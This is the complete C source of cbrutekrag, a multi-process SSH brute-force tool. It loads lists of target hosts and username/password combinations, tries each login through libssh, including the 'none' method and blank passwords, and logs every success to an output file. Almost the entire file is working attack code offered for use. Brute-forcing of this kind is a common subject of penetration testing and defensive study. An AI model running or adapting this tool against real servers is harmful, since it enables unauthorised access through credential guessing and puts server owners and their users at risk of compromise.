/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>
#include <sys/ioctl.h>

#include "cbrutekrag.h"
#include "log.h"
#include "str.h"
#include "wordlist.h"

int g_verbose = 0;
int g_timeout = 3;
char *g_blankpass_placeholder = "$BLANKPASS";

void update_progress(int count, int total, char* suffix, int bar_len)
{
    if (g_verbose) {
        return;
    }

    struct winsize w;
    ioctl(0, TIOCGWINSZ, &w);

    int max_cols = w.ws_col;

    if (bar_len < 0) bar_len = max_cols - 80;
    if (suffix == NULL) suffix = "";

    int filled_len = bar_len * count / total;
    int empty_len = bar_len - filled_len;
    float percents = 100.0f * count / total;
    int fill = max_cols - bar_len - strlen(suffix) - 16;

    if (bar_len > 0) {
        printf("\033[37m[");
        if (filled_len > 0) printf("\033[32m%s", str_repeat("=", filled_len));
        if (empty_len > 0) printf("\033[37m%s", str_repeat("-", empty_len));
        printf("\033[37m]\033[0m");
    }
    if (max_cols > 60) printf("  %.2f%%   %s", percents, suffix);
    if (fill > 0) printf("%s\r", str_repeat(" ", fill));
    fflush(stdout);
}

void print_banner()
{
    printf(
        "\033[92m           _                _       _\n"
        "          | |              | |     | |\n"
        "\033[37m      ___\033[92m | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
        "\033[37m     / __|\033[92m| '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
        "\033[37m    | (__ \033[92m| |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
        "\033[37m     \\___|\033[92m|_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
        "              \033[0m\033[1mOpenSSH Brute force tool 0.3.0\033[0m\033[92m        __/ |\n"
        "          \033[0m(c) Copyright 2014-2018 Jorge Matricali\033[92m  |___/\033[0m\n\n"
    );
}

void usage(const char *p)
{
    printf("\nusage: %s [-h] [-v] [-T TARGETS.lst] [-C combinations.lst]\n"
            "\t\t[-t THREADS] [-o OUTPUT.txt] [TARGETS...]\n\n", p);
}

int try_login(const char *hostname, const char *username, const char *password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;
    int port = 22;

    if (g_verbose) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        log_error("Cant create SSH session.");
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
#if LIBSSH_VERSION_MAYOR > 0 || (LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
#endif
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);

    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (g_verbose) {
            log_error(
                "Error connecting to %s: %s.",
                hostname,
                ssh_get_error(my_ssh_session)
            );
        }
        return -1;
    }

    r = ssh_userauth_none(my_ssh_session, username);
    if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return r;
    }

    int method = 0;

    method = ssh_userauth_list(my_ssh_session, NULL);

    if (method & SSH_AUTH_METHOD_NONE) {
        r = ssh_userauth_none(my_ssh_session, NULL);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    if (method & SSH_AUTH_METHOD_PASSWORD) {
        r = ssh_userauth_password(my_ssh_session, NULL, password);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return -1;
}

int brute(char *hostname, char *username, char *password, int count, int total, FILE *output)
{
    char bar_suffix[50];
    sprintf(bar_suffix, "[%d] %s %s %s", count, hostname, username, password);

    update_progress(count, total, bar_suffix, -1);
    int ret = try_login(hostname, username, password);
    if (ret == 0) {
        log_debug("LOGIN OK!\t%s\t%s\t%s", hostname, username, password);
        if (output != NULL) {
            log_output(output, "LOGIN OK!\t%s\t%s\t%s", hostname, username, password);
        }
        return 0;
    } else {
        log_debug("LOGIN FAIL\t%s\t%s\t%s", hostname, username, password);
    }
    return -1;
}

int main(int argc, char** argv)
{
    int opt;
    int total = 0;
    int THREADS = 1;
    char *hostnames_filename = NULL;
    char *combos_filename = NULL;
    char *output_filename = NULL;
    FILE *output = NULL;

    while ((opt = getopt(argc, argv, "T:C:t:o:vh")) != -1) {
        switch (opt) {
            case 'v':
                g_verbose = 1;
                break;
            case 'T':
                hostnames_filename = optarg;
                break;
            case 'C':
                combos_filename = optarg;
                break;
            case 't':
                THREADS = atoi(optarg);
                break;
            case 'o':
                output_filename = optarg;
                break;
            case 'h':
                print_banner();
                usage(argv[0]);
                printf("  -h                This help\n"
                        "  -v                Verbose mode\n"
                        "  -T <targets>      Targets file\n"
                        "  -C <combinations> Username and password file\n"
                        "  -t <threads>      Max threads\n"
                        "  -o <output>       Output log file\n");
                exit(EXIT_SUCCESS);
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }
    print_banner();

    /* Targets */
    wordlist_t hostnames;
    hostnames.lenght = 0;
    hostnames.words = NULL;

    while (optind < argc) {
        wordlist_append_range(&hostnames, argv[optind]);
        optind++;
    }
    if (hostnames.words == NULL && hostnames_filename == NULL) {
        hostnames_filename = strdup("hostnames.txt");
    }
    if (hostnames_filename != NULL) {
        wordlist_append_from_file(&hostnames, hostnames_filename);
    }

    /* Load username/password combinations */
    if (combos_filename == NULL) {
        combos_filename = strdup("combos.txt");
    }
    wordlist_t combos = wordlist_load(combos_filename);

    /* Calculate total attemps */
    total = hostnames.lenght * combos.lenght;

    printf("\nAmount of username/password combinations: %zu\n", combos.lenght);
    printf("Number of targets: %zu\n", hostnames.lenght);
    printf("Total attemps: %d\n", total);
    printf("Max threads: %d\n\n", THREADS);

    if (total == 0) {
        log_error("No work to do.");
        exit(EXIT_FAILURE);
    }

    /* Output file */
    if (output_filename != NULL) {
        output = fopen(output_filename, "a");
        if (output == NULL) {
            log_error("Error opening output file. (%s)", output_filename);
            exit(EXIT_FAILURE);
        }
    }

    /* Bruteforce */
    pid_t pid = 0;
    int p = 0;
    int count = 0;

    for (int x = 0; x < combos.lenght; x++) {
        char **login_data = str_split(combos.words[x], ' ');
        if (login_data == NULL) {
            continue;
        }
        if (strcmp(login_data[1], g_blankpass_placeholder) == 0) {
            login_data[1] = strdup("");
        }
        for (int y = 0; y < hostnames.lenght; y++) {

            if (p >= THREADS){
                waitpid(-1, NULL, 0);
                p--;
            }

            log_debug(
                "HOSTNAME=%s\tUSERNAME=%s\tPASSWORD=%s",
                hostnames.words[y],
                login_data[0],
                login_data[1]
            );

            pid = fork();

            if (pid) {
                p++;
            } else if(pid == 0) {
                brute(hostnames.words[y], login_data[0], login_data[1], count, total, output);
                exit(EXIT_SUCCESS);
            } else {
                log_error("Fork failed!");
            }

            count++;
        }
    }

    pid = 0;

    if (output != NULL) {
        fclose(output);
    }

    update_progress(count, total, NULL, -1);
    printf("\f");

    exit(EXIT_SUCCESS);
}
